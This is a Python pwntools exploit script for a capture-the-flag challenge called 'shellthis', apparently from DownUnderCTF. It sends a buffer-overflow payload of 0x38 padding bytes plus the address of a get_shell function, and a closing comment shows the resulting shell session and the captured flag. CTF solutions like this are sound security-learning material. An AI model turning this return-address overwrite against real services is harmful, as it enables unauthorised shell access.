#!/usr/bin/env python3
from pwn import *
import sys

def main( host, port):
    shellthis = ELF("./shellthis")

    c = remote(host, port)

    c.recvuntil(b'name: ')

    data = b'a'*0x38
    data += p64( shellthis.symbols['get_shell'])
    data += b'\n'

    input('...')
    c.send(data)

    c.interactive()

    c.close()

    return

if __name__ == '__main__':
    if len(sys.argv) != 3:
        print('[USAGE] %s <target> <port>' %(sys.argv[0]))
        exit(1)

    main(sys.argv[1], int(sys.argv[2]))

'''
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to chal.duc.tf on port 30002: Done
...
[*] Switching to interactive mode
$ ls
flag.txt
shellthis
$ cat flag.txt
DUCTF{h0w_d1d_you_c4LL_That_funCT10n?!?!?}
$
'''
